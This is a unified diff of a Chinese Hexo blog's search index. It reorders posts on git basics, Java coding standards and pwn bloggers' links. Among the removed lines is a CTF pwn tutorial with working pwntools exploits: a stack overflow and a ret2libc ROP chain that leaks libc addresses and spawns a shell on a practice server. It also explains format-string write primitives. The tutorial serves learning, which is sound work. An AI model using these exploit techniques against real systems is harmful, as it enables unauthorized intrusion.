@@ -39,57 +39,6 @@
       </tags>
   </entry>
   <entry>
-    <title>git的基本用法</title>
-    <url>/2022/09/13/git%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/</url>
-    <content><![CDATA[<p> git命令行的基本用法：</p>
-<span id="more"></span>
-
-<h3 id="Git-commit"><a href="#Git-commit" class="headerlink" title="Git commit"></a>Git commit</h3><p>提交内容，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cl.jpg"></p>
-<p>输入指令:<strong>git commit</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cm.jpg"></p>
-<h3 id="Git-branch"><a href="#Git-branch" class="headerlink" title="Git branch"></a>Git branch</h3><p>形成一个新的分支，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cn.jpg"></p>
-<p>输入指令：<strong>git branch newImage</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5co.jpg"></p>
-<p>输入指令：<strong>git checkout newImage + git commit</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cp.jpg"></p>
-<h3 id="Git-merge"><a href="#Git-merge" class="headerlink" title="Git merge"></a>Git merge</h3><p>合并分支，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cq.jpg"></p>
-<p>输入指令<strong>git merge bugFix</strong>,此时会把bugFix包起来，注意当前指针指向Main</p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cr.jpg"></p>
-<p>此时调整指针到bugFix，再合并到main分支即可，命令行：<strong>git checkout bugFix + git merge main</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cs.jpg"></p>
-<h3 id="Git-rebase"><a href="#Git-rebase" class="headerlink" title="Git rebase"></a>Git rebase</h3><p>由并行状态合并为线性状态，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5ct.jpg"></p>
-<p>输入指令：<strong>git rebase main</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cw.jpg"></p>
-<p>输入指令：<strong>git checkout main</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cu.jpg"></p>
-<p><strong>git rebase bugFix</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cv.jpg"></p>
-<h3 id="Git-branch-f-XXX-HEAD-n"><a href="#Git-branch-f-XXX-HEAD-n" class="headerlink" title="Git branch -f XXX HEAD~n"></a>Git branch -f XXX HEAD~n</h3><p>修改main分支到前几次的提交状态，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cP.jpg"></p>
-<p>指令<strong>git branch -f main HEAD~3</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cQ.jpg"></p>
-<h3 id="Git-cherry-pick"><a href="#Git-cherry-pick" class="headerlink" title="Git cherry-pick"></a>Git cherry-pick</h3><p>将后交的状态复制到main分支中，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cR.jpg"></p>
-<p>指令<strong>git cherry-pick c2 c4</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cS.jpg"></p>
-<h3 id="Git-rebase-1"><a href="#Git-rebase-1" class="headerlink" title="Git rebase"></a>Git rebase</h3><p>将已有的提交记录复制一份，可以自行选择顺序，分支，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cT.jpg"></p>
-<p>指令<strong>git rebase -i HEAD~4</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cU.jpg"></p>
-]]></content>
-      <categories>
-        <category>乱七八糟的东东</category>
-      </categories>
-      <tags>
-        <tag>基础</tag>
-        <tag>git</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Java入门基础</title>
     <url>/2022/07/02/Java%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<p> Java初学，包含使用IDEA创建文件，基本程序等等</p>
@@ -178,154 +127,54 @@
       </tags>
   </entry>
   <entry>
-    <title>pwn:从一窍不通到入门的门前</title>
-    <url>/2022/07/06/pwn-%E4%BB%8E%E4%B8%80%E7%AA%8D%E4%B8%8D%E9%80%9A%E5%88%B0%E5%85%A5%E9%97%A8%E7%9A%84%E9%97%A8%E5%89%8D/</url>
-    <content><![CDATA[<p> 基础pwn例题，栈溢出，格式化字符串。</p>
+    <title>git的基本用法</title>
+    <url>/2022/09/13/git%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/</url>
+    <content><![CDATA[<p> git命令行的基本用法：</p>
 <span id="more"></span>
 
-<h3 id="栈溢出例题"><a href="#栈溢出例题" class="headerlink" title="栈溢出例题"></a>栈溢出例题</h3><h4 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h4><p>来源：攻防世界</p>
-<p>首先先checksec：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51X.png"></p>
-<p>再看伪代码：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51Y.png"></p>
-<p>再看偏移量：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51Z.png"></p>
-<p>这里基本就明白了：当dowrd_60106C=1853186401时，执行下面的sub函数，sub函数就直接得出flag了，因此只要再前一步的read函数那里创造栈溢出，再人为满足条件判断即可。</p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./hello_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,52016)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>来源：攻防世界</p>
-<p>checksec:</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a520.png"></p>
-<p>32位程序，开启堆栈不可执行，这是一道构造ROP的经典例题。</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a521.png"></p>
-<p>源码看出漏洞还是栈溢出，但是此时找不到现成的system函数和binsh字符串。</p>
-<p>因此要找到system函数，知识点(搬运自wiki)</p>
-<ul>
-<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
-<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</li>
-<li>查找Libc的网址：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a>和<a href="https://libc.rip/">https://libc.rip/</a></li>
-</ul>
-<p>简单来说：实际的(真实的)地址是需要计算出来的，具体计算方式是：<strong>实际地址=libc偏移量+libc基地址</strong>在已知libc的情况下，我们需要做的就是找到<strong>libc的基址</strong>，而想要找到基址，我们需要知道一个函数的实际地址，本题中关键函数内存在write,read函数，因此想法是使用write函数泄露出write函数的真实地址，而plt表，got表，实际加载地址可以参考下图(搬运自csdn(滑稽))：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a522.png"></p>
-<p>这样就可以得到基本的思路了: 先构造栈溢出使程序跳到write函数的plt表地址上，此时再次调用main函数或者vulnerable函数再次执行，此时就可以利用write函数打印出write的got表地址，此时需要我们人为的输入write函数的参数。这样就可以得到write函数的真实地址了。栈上的流程大概是这样的（仍然是搬运的(滑天下之大稽）：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a523.png"></p>
-<p>这样输出之后我们就得到了write函数的真实地址了，再通过libc来求得system和binsh的真实地址，最后第二次调动程序，再次利用漏洞，就可以得到shell。</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">59245</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(write_got_addr)</span><br><span class="line"></span><br><span class="line">libc_write=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base=write_got_addr-libc_write</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the system address is:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_bin=<span class="built_in">next</span>(libc.search(<span class="string">b&quot;bin/sh&quot;</span>))//找到binsh偏移的方法</span><br><span class="line">bin_addr=libc_base+libc_bin</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the binsh address is:&quot;</span>,<span class="built_in">hex</span>(bin_addr))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*padding+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>基本原理以及利用方法在wiki上有解释。</p>
-<p>&lt;<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">原理介绍 - CTF Wiki (ctf-wiki.org)</a>&gt;</p>
-<p>主要意思是利用printf一类函数漏洞，当函数没有严格规定格式化字符串时，攻击者可以控制printf函数来输出其他内容，由于格式化字符串输出的是栈上内容，因此此漏洞可以找到栈上其他位置的信息，比如地址，数据。总结一下就是：超出的每一个格式化字符串都能对下一格栈空间造成影响。</p>
-<p>%d:打印成数字，只能泄露栈本身内容</p>
-<p>%x:打印成16进制，只能泄露栈本身内容</p>
-<p>%s:识别栈上内容为指针，打印出该指针指向的位置，这里有可能造成任意地址的泄露（只要能控制栈并完成布局）</p>
-<p>%c:输出字符</p>
-<p>%n:把前面已经打印的长度<strong>写入</strong>某个内存地址(实现任意地址写入)</p>
-<p>%n:写入4个字节，写入1–&gt;0000 0001</p>
-<p>%hn:写入两个字节，写入1–&gt;0001</p>
-<p>%hhn:写入单个字节,写入1–&gt;01</p>
-<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>啥都没有，因为懒得搞，搞堆去了</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51S.jpg"></p>
+<h3 id="Git-commit"><a href="#Git-commit" class="headerlink" title="Git commit"></a>Git commit</h3><p>提交内容，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cl.jpg"></p>
+<p>输入指令:<strong>git commit</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cm.jpg"></p>
+<h3 id="Git-branch"><a href="#Git-branch" class="headerlink" title="Git branch"></a>Git branch</h3><p>形成一个新的分支，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cn.jpg"></p>
+<p>输入指令：<strong>git branch newImage</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5co.jpg"></p>
+<p>输入指令：<strong>git checkout newImage + git commit</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cp.jpg"></p>
+<h3 id="Git-merge"><a href="#Git-merge" class="headerlink" title="Git merge"></a>Git merge</h3><p>合并分支，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cq.jpg"></p>
+<p>输入指令<strong>git merge bugFix</strong>,此时会把bugFix包起来，注意当前指针指向Main</p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cr.jpg"></p>
+<p>此时调整指针到bugFix，再合并到main分支即可，命令行：<strong>git checkout bugFix + git merge main</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cs.jpg"></p>
+<h3 id="Git-rebase"><a href="#Git-rebase" class="headerlink" title="Git rebase"></a>Git rebase</h3><p>由并行状态合并为线性状态，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5ct.jpg"></p>
+<p>输入指令：<strong>git rebase main</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cw.jpg"></p>
+<p>输入指令：<strong>git checkout main</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cu.jpg"></p>
+<p><strong>git rebase bugFix</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cv.jpg"></p>
+<h3 id="Git-branch-f-XXX-HEAD-n"><a href="#Git-branch-f-XXX-HEAD-n" class="headerlink" title="Git branch -f XXX HEAD~n"></a>Git branch -f XXX HEAD~n</h3><p>修改main分支到前几次的提交状态，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cP.jpg"></p>
+<p>指令<strong>git branch -f main HEAD~3</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cQ.jpg"></p>
+<h3 id="Git-cherry-pick"><a href="#Git-cherry-pick" class="headerlink" title="Git cherry-pick"></a>Git cherry-pick</h3><p>将后交的状态复制到main分支中，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cR.jpg"></p>
+<p>指令<strong>git cherry-pick c2 c4</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cS.jpg"></p>
+<h3 id="Git-rebase-1"><a href="#Git-rebase-1" class="headerlink" title="Git rebase"></a>Git rebase</h3><p>将已有的提交记录复制一份，可以自行选择顺序，分支，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cT.jpg"></p>
+<p>指令<strong>git rebase -i HEAD~4</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cU.jpg"></p>
 ]]></content>
       <categories>
-        <category>CTF!</category>
+        <category>乱七八糟的东东</category>
       </categories>
       <tags>
         <tag>基础</tag>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>“代码规范”</title>
-    <url>/2022/08/02/%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/</url>
-    <content><![CDATA[<p> 软件开发代码规范:</p>
-<span id="more"></span>
-
-<h1 id="JAVA代码规范"><a href="#JAVA代码规范" class="headerlink" title="JAVA代码规范"></a>JAVA代码规范</h1><h2 id="普通规范"><a href="#普通规范" class="headerlink" title="普通规范"></a>普通规范</h2><h4 id="包的命名方式：公司域名倒置-子公司-产品名称-功能名称"><a href="#包的命名方式：公司域名倒置-子公司-产品名称-功能名称" class="headerlink" title="包的命名方式：公司域名倒置+子公司/产品名称+功能名称"></a>包的命名方式：公司域名倒置+子公司/产品名称+功能名称</h4><p>如：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">net.hedao.music</span><br><span class="line">net.hedao.uem.internal</span><br><span class="line">net.hedao.uem.http</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="utils和tools命名规范"><a href="#utils和tools命名规范" class="headerlink" title="utils和tools命名规范"></a>utils和tools命名规范</h4><p>utils:</p>
-<ul>
-<li>定义：通用的，与业务无关，可供其他项目使用</li>
-<li>方法通常是public static;一般无类的属性，有的话也是public static</li>
-<li>例子：字符串类，文件工具类</li>
-</ul>
-<p>tools:</p>
-<ul>
-<li>定义：在当前项目通用；仅能在当前项目使用</li>
-<li>方法通常是public static;一般无类的属性，有的话也是public static</li>
-<li>用户校验类，支付工具类</li>
-</ul>
-<h4 id="类名规范"><a href="#类名规范" class="headerlink" title="类名规范"></a>类名规范</h4><p>类名首字母大写，若多个单词拼合则采取驼峰式命名</p>
-<p>如：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestDemo</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="成员属性"><a href="#成员属性" class="headerlink" title="成员属性"></a>成员属性</h4><p>成员属性，变量名使用有含义的单词或词组构成；</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">long</span> abc=<span class="number">0</span>;<span class="comment">//禁止</span></span><br></pre></td></tr></table></figure>
-
-<p>常量必须由大写字母和下划线分割单词的方式组成</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_NUMBER</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br></pre></td></tr></table></figure>
-
-<p>静态变量:采用小写s开头，代表static，s后首字母大写，遵循驼峰原则</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">long</span> sCurrentTime;</span><br></pre></td></tr></table></figure>
-
-<p>实体类，java bean类中普通成员变量采用小写字母开头，单词之间采用驼峰式命名规范。</p>
-<p>注：此类用于存储数据，只有setter,getter方法，不作其他业务处理</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line">			<span class="keyword">private</span> String userName;</span><br><span class="line">			<span class="keyword">private</span> String userAccount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="方法的命名规范"><a href="#方法的命名规范" class="headerlink" title="方法的命名规范"></a>方法的命名规范</h4><p>方法命名采用小写字母开头，字母之间采用驼峰式命名规范，一般不超过20个字符，长度很长时可以使用简写</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">long</span> <span class="title function_">calculateScreenSize</span><span class="params">()</span> &#123;<span class="comment">//计算屏幕尺寸，正确</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> UserInfo <span class="title function_">getCustomUInfo</span><span class="params">()</span> &#123;<span class="comment">//获取客户个人信息，正确</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">long</span> <span class="title function_">size</span><span class="params">()</span> &#123;<span class="comment">//计算屏幕尺寸，错误</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> UserInfo <span class="title function_">getCustomUserInfomation</span><span class="params">()</span> &#123;<span class="comment">//获取客户个人信息，错误</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="注释规范"><a href="#注释规范" class="headerlink" title="注释规范"></a>注释规范</h2><p>注释：</p>
-<ul>
-<li>屏蔽不需要执行的代码</li>
-<li>对代码进行解释说明</li>
-</ul>
-<h4 id="类的注释"><a href="#类的注释" class="headerlink" title="类的注释"></a>类的注释</h4><p>类的注释采用多行注释方式，在包名和类定义中间，通常记录作者信息，版本号，类的功能描述信息等。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">* 文件工具类</span></span><br><span class="line"><span class="comment">* 项目名称:JAVA编码规范测试用例</span></span><br><span class="line"><span class="comment">* 包:net.herdao.common.utils   </span></span><br><span class="line"><span class="comment">* 类名称:FileUtils.java</span></span><br><span class="line"><span class="comment">* 类描述:本类是一个文件操作工具类，包括了文件的几个基本操作方法，创建文件、删除文件、文件重命名</span></span><br><span class="line"><span class="comment">* 创建人:林鸿亮</span></span><br><span class="line"><span class="comment">* 创建时间:2021/10/21 11:46</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileUtils</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="方法的注释"><a href="#方法的注释" class="headerlink" title="方法的注释"></a>方法的注释</h4><p>多行注释，主要内容记录该方法的<strong>作用</strong>，<strong>参数及参数说明</strong>，<strong>返回值</strong>、<strong>返回类容</strong>和<strong>异常信息说明</strong>，<strong>修改记录</strong>，<strong>是否过期</strong>，及<strong>修改日期</strong>等等。</p>
-<p>我们规定所有public类型的方法必须加上注释<strong>对方法和参数</strong>加以说明，private方法中如果处理逻辑相对较多，相对复杂的也应加上注释。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 在指定目录创建一个新文件</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> dirPath  文件目录路径</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> fileName 文件名称</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span>  返回创建的新文件</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> File <span class="title function_">createeNewFile</span><span class="params">(String dirPath, String fileName)</span> </span><br><span class="line">&#123;<span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dirPath,fileName);</span><br><span class="line"> <span class="keyword">return</span> file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="成员属性的注释"><a href="#成员属性的注释" class="headerlink" title="成员属性的注释"></a>成员属性的注释</h4><p>可以使用单行注释也可以使用多行注释</p>
-<p>代码块和单行代码通常采用单行注释</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deleteFile</span><span class="params">(File file)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (file != <span class="literal">null</span> &amp;&amp; file.exists()) &#123; <span class="comment">//判断文件是否存在</span></span><br><span class="line">file.delete(); <span class="comment">//删除文件</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="代码格式规范"><a href="#代码格式规范" class="headerlink" title="代码格式规范"></a>代码格式规范</h3><h4 id="统一编码格式"><a href="#统一编码格式" class="headerlink" title="统一编码格式"></a>统一编码格式</h4><p>统一采用UTF-8的格式</p>
-<h4 id="编码的缩进"><a href="#编码的缩进" class="headerlink" title="编码的缩进"></a>编码的缩进</h4><p>缩进空格数为4，同一业务级代码块保持左对齐，不能全在同一垂直线上</p>
-<h4 id="代码行宽度"><a href="#代码行宽度" class="headerlink" title="代码行宽度"></a>代码行宽度</h4><p>单行代码最长不得超过120列</p>
-<h4 id="代码行长度"><a href="#代码行长度" class="headerlink" title="代码行长度"></a>代码行长度</h4><p>方法长度限制在100行内，若有超过可能按照<strong>业务逻辑</strong>拆分成多个方法</p>
-<h4 id="属性及方法的范围确定"><a href="#属性及方法的范围确定" class="headerlink" title="属性及方法的范围确定"></a>属性及方法的范围确定</h4><ul>
-<li><p>public : 当某个方法或属性需要<strong>被外部非子类和非同包内中的对象直接调用</strong>的时候采用public属性。</p>
-</li>
-<li><p>protected : 当某个方法或属性<strong>只会被其子类调用</strong>或者<strong>只会同一包下的其他对象调用</strong>时，使用protected限制。</p>
-</li>
-<li><p>private: 当某个方法或属性<strong>只会被本类中的其他方法调用</strong>的时候，使用private限制。</p>
-</li>
-</ul>
-<h4 id="硬编码的后遗症"><a href="#硬编码的后遗症" class="headerlink" title="硬编码的后遗症"></a>硬编码的后遗症</h4><p>常量字符串或数值必须<strong>在类中定义常量值</strong>，通过<strong>常量值引用</strong>来使用固定数值和固定字符串</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">public static final int MIN_DATA = 1;</span><br><span class="line">public static final int MAX_DATA = 99;</span><br><span class="line">public static final String STR_SUM = &quot;岗位评分结果为=&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private void printSum() &#123;</span><br><span class="line">System.out.println(STR_SUM+(MIN_DATA+MAX_DATA));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="TODO规范"><a href="#TODO规范" class="headerlink" title="TODO规范"></a>TODO规范</h4><p>用来描述已知待改进，待补充的修改点，加上作者名称</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// TODO &lt;“作者名称”&gt;: 补充XX处理</span><br></pre></td></tr></table></figure>
-
-<h4 id="方法参数规范"><a href="#方法参数规范" class="headerlink" title="方法参数规范"></a>方法参数规范</h4><p>每个方法最多三个参数，超出三个要封装成javabean对象</p>
-<h4 id="SysLog日志注解使用"><a href="#SysLog日志注解使用" class="headerlink" title="@SysLog日志注解使用"></a>@SysLog日志注解使用</h4><p>接口涉及增删改数据时必须使用@SysLog注解。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(value = &quot;权限配置-修改用户角色&quot;,notes = &quot;权限配置-修改用户角色&quot;)</span></span><br><span class="line"><span class="meta">@SysLog(&quot;权限配置-修改用户角色&quot;)</span></span><br><span class="line"><span class="meta">@PutMapping(value = &quot;/editUserRole&quot;)</span></span><br><span class="line"><span class="keyword">public</span> R&lt;Boolean&gt; <span class="title function_">saveUserRole</span><span class="params">(<span class="meta">@RequestBody</span> UserDTO userDTO)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(userDTO.getUserId() == <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> R.failed(Boolean.FALSE).setMsg(<span class="string">&quot;用户id不能为空&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> R.ok(userService.saveUserRole(userDTO));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="工程框架规范"><a href="#工程框架规范" class="headerlink" title="工程框架规范"></a>工程框架规范</h3><h4 id="应用分层"><a href="#应用分层" class="headerlink" title="应用分层"></a>应用分层</h4><p>代码分层为MVC方式，<strong>不能</strong>用DDD方式修改代码目录结构</p>
-<h4 id="依赖包管理版本规范"><a href="#依赖包管理版本规范" class="headerlink" title="依赖包管理版本规范"></a>依赖包管理版本规范</h4><p>基础平台父工程hdp已经引入绝大部分开发所需maven 依赖包，如果需要增加依赖包必须先征得架构师同意。业务项目<strong>不得重复添加已有依赖包</strong>，所添加依赖包版本必须<strong>与基础平台依赖包版本一致</strong>，引入后必须<strong>处理依赖冲突</strong>。</p>
-]]></content>
-      <categories>
-        <category>编程语言</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-        <tag>常用规范</tag>
+        <tag>git</tag>
       </tags>
   </entry>
   <entry>
@@ -496,23 +345,163 @@
       </tags>
   </entry>
   <entry>
-    <title>计算机体系结构复习</title>
-    <url>/2022/06/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
-    <content><![CDATA[<p> 大一下预习计算机体系结构</p>
+    <title>大牛的博客(学习用)</title>
+    <url>/2022/09/22/%E5%A4%A7%E7%89%9B%E7%9A%84%E5%8D%9A%E5%AE%A2-%E5%AD%A6%E4%B9%A0%E7%94%A8/</url>
+    <content><![CDATA[<p> 这里收录一些大佬的博客，可以跟着学习：</p>
 <span id="more"></span>
 
-<h4 id="原码反码补码"><a href="#原码反码补码" class="headerlink" title="原码反码补码"></a>原码反码补码</h4><ul>
-<li>原码：二进制形式</li>
-<li>反码：原码除符号位不变，其余全部取反</li>
-<li>补码：反码加一 ($a-b$的意思是a加上b的补码)</li>
+<h2 id="Pwn手师傅们的博客"><a href="#Pwn手师傅们的博客" class="headerlink" title="Pwn手师傅们的博客"></a>Pwn手师傅们的博客</h2><p><a href="https://godjj.top/">https://godjj.top/</a></p>
+<p><a href="https://csomepro.github.io/">https://csomepro.github.io/</a></p>
+<p><a href="https://www.cnblogs.com/ZIKH26">https://www.cnblogs.com/ZIKH26</a></p>
+<p><a href="https://github.com/tangzichengcc/The_Growth_Path_Of_A_CTFer_And_Pwner">https://github.com/tangzichengcc/The_Growth_Path_Of_A_CTFer_And_Pwner</a></p>
+<p><a href="http://blog.eonew.cn/">http://blog.eonew.cn/</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>“代码规范”</title>
+    <url>/2022/08/02/%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/</url>
+    <content><![CDATA[<p> 软件开发代码规范:</p>
+<span id="more"></span>
+
